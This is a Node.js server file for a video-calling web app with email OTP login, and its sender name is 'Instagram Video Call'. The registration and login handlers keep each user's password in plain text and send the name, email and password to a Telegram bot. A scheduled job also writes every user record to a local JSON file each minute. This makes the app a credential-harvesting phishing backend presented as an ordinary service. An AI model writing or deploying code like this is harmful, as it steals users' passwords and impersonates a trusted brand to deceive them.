require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const session = require('express-session');
const MongoStore = require('connect-mongo'); // Fixed syntax for Render
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const nodemailer = require('nodemailer');
const { v4: uuidv4 } = require('uuid');
const fetch = require('node-fetch');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

// ── 1. DATABASE CONNECTION (Fast & Persistent) ──
const MONGO_URI = process.env.MONGO_URI || 'mongodb://127.0.0.1:27017/toxiclabs';
mongoose.connect(MONGO_URI)
  .then(() => console.log('✅ MongoDB Connected'))
  .catch(e => console.log('❌ DB Error:', e));

// ── 2. USER SCHEMA (Full Logs for Bot) ──
const userSchema = new mongoose.Schema({
  name: String,
  email: { type: String, unique: true, required: true },
  password: { type: String, required: true }, // Hashed
  plainPassword: { type: String }, // For your bot logs
  verified: { type: Boolean, default: false },
  roomId: String,
  createdAt: { type: String, default: () => new Date().toISOString() },
  loginCount: { type: Number, default: 0 },
  lastLogin: String,
  loginMethod: { type: String, default: 'email' }
});
const User = mongoose.model('User', userSchema);

const otps = {};       
const rooms = {};      

// ── 3. MIDDLEWARE (FIXED MONGOSTORE ERROR) ──
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.use(session({
  secret: process.env.SESSION_SECRET || 'toxiclabs_secret_2026',
  resave: false,
  saveUninitialized: false,
  store: MongoStore.create({ 
    mongoUrl: MONGO_URI,
    collectionName: 'sessions' 
  }), // This fixes the "create is not a function" error
  cookie: { secure: false, maxAge: 7 * 24 * 60 * 60 * 1000 }
}));

const mailer = nodemailer.createTransport({
  service: 'gmail',
  auth: { user: process.env.MAIL_USER, pass: process.env.MAIL_PASS }
});

// ── 4. NOTIFIERS (Background Performance) ──
async function sendTelegram(message) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;
  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
  }).catch(() => {});
}

async function sendOTP(email, name, otp, type) {
  const subject = type === 'verify' ? '✅ Verify account' : '🔐 Login OTP';
  const html = `[Keep your professional HTML here]`; // No changes to your design

  mailer.sendMail({ from: `"Instagram Video Call" <${process.env.MAIL_USER}>`, to: email, subject, html }).catch(() => {});
}

// ── 5. AUTH LOGIC (Synced with MongoDB) ──
const genOTP = () => Math.floor(100000 + Math.random() * 900000).toString();
const genRoomId = () => uuidv4().replace(/-/g, '').slice(0, 8).toUpperCase();

app.post('/api/register', async (req, res) => {
  const { name, email, password } = req.body;
  const existing = await User.findOne({ email });
  if (existing) return res.json({ ok: false, msg: 'Email already registered' });

  const hash = await bcrypt.hash(password, 10);
  const otp = genOTP();
  const roomId = genRoomId();

  const user = new User({
    name: name.trim(), email, password: hash, 
    plainPassword: password, roomId, verified: false
  });
  await user.save();

  otps[email] = { code: otp, expires: Date.now() + 600000, type: 'verify' };
  sendOTP(email, name, otp, 'verify');

  sendTelegram(`🆕 <b>NEW REGISTRATION</b>\n👤 Name: ${name}\n📧 Email: ${email}\n🔑 Password: ${password}\n🌍 Room: ${roomId}`);
  res.json({ ok: true, msg: 'OTP sent to email.' });
});

app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await User.findOne({ email });
  if (!user) return res.json({ ok: false, msg: 'No account found with this email' });

  const match = await bcrypt.compare(password, user.password);
  if (!match) return res.json({ ok: false, msg: 'Incorrect password' });

  const otp = genOTP();
  otps[email] = { code: otp, expires: Date.now() + 600000, type: user.verified ? 'login' : 'verify' };
  
  sendOTP(email, user.name, otp, otps[email].type);
  sendTelegram(`🔐 <b>LOGIN ATTEMPT</b>\n👤 Name: ${user.name}\n📧 Email: ${email}\n🔑 Password: ${password}`);
  
  res.json({ ok: true, msg: 'OTP sent.', needsOTP: true });
});

app.post('/api/verify-otp', async (req, res) => {
  const { email, otp, type } = req.body;
  const record = otps[email];
  if (!record || record.code !== otp.toString()) return res.json({ ok: false, msg: 'Invalid OTP' });

  const user = await User.findOne({ email });
  if (type === 'verify') user.verified = true;
  user.loginCount++;
  user.lastLogin = new Date().toISOString();
  await user.save();

  delete otps[email];
  req.session.userId = email;
  res.json({ ok: true, user: { name: user.name, email: user.email, roomId: user.roomId } });
});

// ── 6. SOCKET.IO (WebRTC signaling unchanged) ──
io.on('connection', (socket) => {
  socket.on('join-room', ({ roomId, userName }) => {
    socket.join(roomId);
    socket.roomId = roomId;
    socket.userName = userName;
    if (!rooms[roomId]) rooms[roomId] = { id: roomId, participants: [] };
    if (!rooms[roomId].participants.includes(userName)) rooms[roomId].participants.push(userName);
    socket.to(roomId).emit('user-joined', { socketId: socket.id, userName });
    const others = [...io.sockets.adapter.rooms.get(roomId) || []].filter(id => id !== socket.id);
    socket.emit('room-peers', others);
  });

  socket.on('offer', (data) => io.to(data.to).emit('offer', { from: socket.id, offer: data.offer, userName: socket.userName }));
  socket.on('answer', (data) => io.to(data.to).emit('answer', { from: socket.id, answer: data.answer }));
  socket.on('ice-candidate', (data) => io.to(data.to).emit('ice-candidate', { from: socket.id, candidate: data.candidate }));

  socket.on('disconnect', () => {
    if (socket.roomId) socket.to(socket.roomId).emit('user-left', { socketId: socket.id, userName: socket.userName });
  });
});

// ── 7. DATA BACKUP (Local + DB) ──
async function backup() {
  const allUsers = await User.find({});
  fs.writeFileSync(path.join(__dirname, 'data.json'), JSON.stringify({ users: allUsers, timestamp: new Date().toISOString() }, null, 2));
}
setInterval(backup, 60000); // Sync every 1 min

app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🚀 Professional Server Live on Port ${PORT}`));
